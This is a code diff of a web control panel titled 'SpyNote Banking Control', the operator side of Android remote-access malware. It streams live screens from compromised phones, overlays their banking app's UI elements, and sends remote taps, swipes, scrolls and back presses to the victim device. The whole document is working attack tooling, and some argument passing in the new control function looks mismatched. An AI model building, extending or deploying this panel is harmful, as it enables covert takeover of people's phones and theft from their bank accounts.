@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>📱 SpyNote Control Panel</title>
+    <title>📱 SpyNote Banking Control</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <style>
@@ -14,14 +14,13 @@
         #devices {
             position: fixed; top: 10px; left: 10px; 
             background: rgba(0,0,0,0.9); padding: 15px; 
-            max-height: 80vh; overflow-y: auto; width: 280px; 
+            max-height: 80vh; overflow-y: auto; width: 300px; 
             border-radius: 10px; backdrop-filter: blur(10px);
         }
         .device { padding: 12px; margin: 8px 0; background: #333; cursor: pointer; 
             border-radius: 8px; transition: all 0.3s; }
         .device:hover { background: #555; transform: translateX(5px); }
         .active { background: #00ff88 !important; color: #000; }
-        .disconnected { opacity: 0.5; }
 
         #phone-frame {
             width: 400px; height: 800px; margin: 20px auto; 
@@ -31,8 +30,21 @@
         }
         #screen { 
             width: 100%; height: 100%; background: #111; border-radius: 20px;
-            image-rendering: pixelated; image-rendering: -webkit-optimize-contrast;
+            image-rendering: pixelated; position: relative;
         }
+
+        /* 🔥 BANKING LAYOUT OVERLAY */
+        .ui-element {
+            position: absolute; border-radius: 4px; font-size: 11px; 
+            padding: 2px 4px; cursor: pointer; backdrop-filter: blur(5px);
+            border: 1px solid rgba(255,255,255,0.3); transition: all 0.2s;
+        }
+        .ui-text { background: rgba(0,255,136,0.8); color: #000; }
+        .ui-button { background: rgba(255,107,53,0.9); color: white; }
+        .ui-search { background: rgba(59,130,246,0.9); color: white; }
+        .ui-element:hover { transform: scale(1.2); box-shadow: 0 0 10px rgba(0,255,136,0.8); }
+        .ui-element.clickable { border: 2px solid #ffeb3b; }
+
         #fps-counter { position: fixed; top: 10px; right: 150px; font-size: 12px; color: #00ff88; }
         #status { position: fixed; top: 10px; right: 10px; background: rgba(0,0,0,0.8); 
             padding: 10px; border-radius: 5px; font-size: 12px; }
@@ -47,17 +59,28 @@
         button:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,123,255,0.6); }
         button.active { background: linear-gradient(45deg, #00ff88, #00cc66); }
         .scroll-btn { background: linear-gradient(45deg, #ff6b35, #e55a2b) !important; }
+        #element-list { 
+            position: fixed; bottom: 100px; left: 20px; 
+            background: rgba(0,0,0,0.95); padding: 15px; 
+            max-height: 200px; overflow-y: auto; width: 280px; 
+            border-radius: 10px; display: none;
+        }
+        .element-item { 
+            padding: 8px; margin: 4px 0; background: #444; 
+            cursor: pointer; border-radius: 6px; font-size: 12px;
+        }
+        .element-item:hover { background: #666; }
     </style>
 </head>
 <body>
     <div id="devices">
-        <h3>📱 Devices</h3>
+        <h3>📱 Banking Control</h3>
         <div id="device-list">Loading...</div>
     </div>
     
     <div id="status">
         <div>Status: <span id="connectionStatus">Connecting...</span></div>
-        <div>FPS: <span id="fps">0</span> | Device: <span id="selectedDevice">-</span></div>
+        <div>FPS: <span id="fps">0</span> | <span id="selectedDevice">-</span></div>
     </div>
     <div id="fps-counter">FPS: 0</div>
 
@@ -65,9 +88,14 @@
         <canvas id="screen"></canvas>
     </div>
 
+    <div id="element-list">
+        <h4>🔍 Found Elements:</h4>
+        <div id="elements"></div>
+    </div>
+
     <div id="controls">
+        <button onclick="toggleLayoutOverlay()" id="layoutBtn">👁️ Layout</button>
         <button onclick="sendBack()" id="backBtn">🔙 Back</button>
-        <button onclick="toggleFullScreen()" id="fsBtn">📱 Full</button>
         <button onclick="toggleScroll()" id="scrollBtn">↕️ Scroll</button>
     </div>
 
@@ -77,8 +105,10 @@
         let deviceWidth = 1080, deviceHeight = 1920;
         let lastFrameTime = 0, frameCount = 0;
         let scrollMode = false;
-        let startX = 0, startY = 0, dragging = false;
-        let scrollStartY = 0;
+        let showLayout = true;
+        let uiElements = [];
+        let dragging = false;
+        let startX = 0, startY = 0;
 
         const canvas = document.getElementById('screen');
         const ctx = canvas.getContext('2d');
@@ -88,6 +118,8 @@
         const selectedDevice = document.getElementById('selectedDevice');
         const fpsCounter = document.getElementById('fps-counter');
         const fpsDisplay = document.getElementById('fps');
+        const elementList = document.getElementById('element-list');
+        const elementsDiv = document.getElementById('elements');
 
         socket.on('connect', () => {
             connectionStatus.textContent = '✅ Connected';
@@ -98,7 +130,7 @@
             updateDeviceList(devices);
         });
 
-        // 🔥 PERFECT Screen Streaming
+        // 🔥 LIVE SCREEN
         socket.on('screen-update', (data) => {
             if (data.deviceId !== currentDevice) return;
             
@@ -114,6 +146,9 @@
                     
                     ctx.imageSmoothingEnabled = false;
                     ctx.drawImage(img, 0, 0, rect.width, rect.height);
+                    
+                    // 🔥 DRAW LAYOUT OVERLAY
+                    drawLayoutOverlay(rect);
                     
                     frameCount++;
                     const now = performance.now();
@@ -131,16 +166,22 @@
             }
         });
 
+        // 🔥 BANKING LAYOUT DATA
+        socket.on('ui-layout-update', (data) => {
+            if (data.deviceId !== currentDevice) return;
+            uiElements = data.elements || [];
+            updateElementList();
+        });
+
         fetch('/devices').then(r => r.json()).then(updateDeviceList);
 
         function updateDeviceList(devices) {
             deviceList.innerHTML = devices.length ? 
                 devices.map(([id, info]) => `
-                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
-                         onclick="selectDevice('${id}', this)">
+                    <div class="device" onclick="selectDevice('${id}', this)">
                         <b>${info.model || id.slice(0,8)}</b><br>
                         <small>${info.brand} ${info.version || ''}</small>
-                        ${info.connected ? '🟢 LIVE' : '🔴 OFF'}
+                        🟢 LIVE
                     </div>
                 `).join('') : 'No devices';
         }
@@ -150,7 +191,6 @@
             selectedDevice.textContent = deviceId.slice(0,8);
             document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
             el.classList.add('active');
-            socket.emit('control', { deviceId });
         }
 
         function getScaledCoords(clientX, clientY) {
@@ -163,7 +203,49 @@
             };
         }
 
-        // 🔥 PERFECT Touch Controls (Tap + Swipe + Scroll)
+        // 🔥 DRAW LAYOUT OVERLAY
+        function drawLayoutOverlay(rect) {
+            if (!showLayout || uiElements.length === 0) return;
+            
+            const scaleX = rect.width / deviceWidth;
+            const scaleY = rect.height / deviceHeight;
+            
+            uiElements.forEach(el => {
+                const overlay = document.getElementById(`ui-${el.id}`);
+                if (!overlay) {
+                    const div = document.createElement('div');
+                    div.id = `ui-${el.id}`;
+                    div.className = `ui-element ui-${el.type}`;
+                    div.textContent = el.text || el.className || '?';
+                    div.style.left = `${el.bounds.left * scaleX}px`;
+                    div.style.top = `${el.bounds.top * scaleY}px`;
+                    div.style.width = `${(el.bounds.right - el.bounds.left) * scaleX}px`;
+                    div.style.height = `${(el.bounds.bottom - el.bounds.top) * scaleY}px`;
+                    div.onclick = () => clickElement(el);
+                    document.getElementById('screen').appendChild(div);
+                }
+            });
+        }
+
+        function updateElementList() {
+            elementsDiv.innerHTML = uiElements.map(el => `
+                <div class="element-item" onclick="clickElementByText('${el.text || el.className}')">
+                    ${el.type === 'button' ? '🔘' : el.type === 'text' ? '📝' : '🔍'}
+                    ${el.text || el.className || 'Unknown'} (${Math.round(el.bounds.left)},${Math.round(el.bounds.top)})
+                </div>
+            `).join('');
+        }
+
+        function clickElement(element) {
+            sendControl('tap', element.bounds.centerX, element.bounds.centerY, element.text);
+        }
+
+        function clickElementByText(text) {
+            const el = uiElements.find(e => (e.text || e.className || '').includes(text));
+            if (el) clickElement(el);
+        }
+
+        // 🔥 Touch Controls
         ['mousedown', 'touchstart'].forEach(event => {
             phoneFrame.addEventListener(event, e => {
                 e.preventDefault();
@@ -172,9 +254,7 @@
                     e.touches?.[0]?.clientX || e.clientX,
                     e.touches?.[0]?.clientY || e.clientY
                 );
-                startX = coords.x; 
-                startY = coords.y;
-                scrollStartY = coords.y;
+                startX = coords.x; startY = coords.y;
             });
         });
 
@@ -188,12 +268,10 @@
                 );
                 
                 if (scrollMode) {
-                    // 🔥 SCROLL MODE
-                    const scrollDistance = coords.y - scrollStartY;
-                    sendScroll(scrollDistance);
+                    const scrollDistance = coords.y - startY;
+                    sendControl('scroll', 0, scrollDistance);
                 } else {
-                    // 🔥 SWIPE MODE
-                    sendSwipe(startX, startY, coords.x, coords.y);
+                    sendControl('swipe', startX, startY, coords.x, coords.y);
                 }
             });
         });
@@ -204,58 +282,48 @@
                 dragging = false;
                 
                 if (!scrollMode) {
-                    // 🔥 TAP MODE (short press)
-                    const timeDiff = Date.now() - (window.lastTouchTime || 0);
-                    if (timeDiff < 150) {
-                        sendTap(startX, startY);
-                    }
+                    sendControl('tap', startX, startY);
                 }
-                window.lastTouchTime = Date.now();
             });
         });
 
-        function sendTap(x, y) {
+        function sendControl(action, x, y, endX, endY, scrollDistance, elementText) {
             socket.emit('control', { 
                 deviceId: currentDevice, 
-                action: 'tap', 
-                x, y 
+                action, 
+                x, y, 
+                endX, endY, 
+                scrollDistance,
+                elementText
             });
+        }
+
+        function sendTap(x, y) {
+            sendControl('tap', x, y);
         }
 
         function sendSwipe(sx, sy, ex, ey) {
-            socket.emit('control', { 
-                deviceId: currentDevice, 
-                action: 'swipe', 
-                startX: sx, startY: sy, 
-                endX: ex, endY: ey 
-            });
+            sendControl('swipe', sx, sy, ex, ey);
         }
 
         function sendScroll(distance) {
-            socket.emit('control', { 
-                deviceId: currentDevice, 
-                action: 'scroll', 
-                scrollDistance: distance * 2 
-            });
+            sendControl('scroll', 0, distance);
         }
 
         function sendBack() {
-            socket.emit('control', { deviceId: currentDevice, action: 'back' });
+            sendControl('back');
         }
 
         function toggleScroll() {
             scrollMode = !scrollMode;
             document.getElementById('scrollBtn').textContent = scrollMode ? '👆 Normal' : '↕️ Scroll';
-            document.getElementById('scrollBtn').classList.toggle('scroll-btn', scrollMode);
-            document.getElementById('scrollBtn').classList.toggle('active', scrollMode);
         }
 
-        function toggleFullScreen() {
-            if (!document.fullscreenElement) {
-                document.documentElement.requestFullscreen();
-            } else {
-                document.exitFullscreen();
-            }
+        function toggleLayoutOverlay() {
+            showLayout = !showLayout;
+            document.querySelectorAll('.ui-element').forEach(el => el.remove());
+            document.getElementById('layoutBtn').textContent = showLayout ? '🙈 Hide' : '👁️ Layout';
+            document.getElementById('element-list').style.display = showLayout ? 'block' : 'none';
         }
     </script>
 </body>
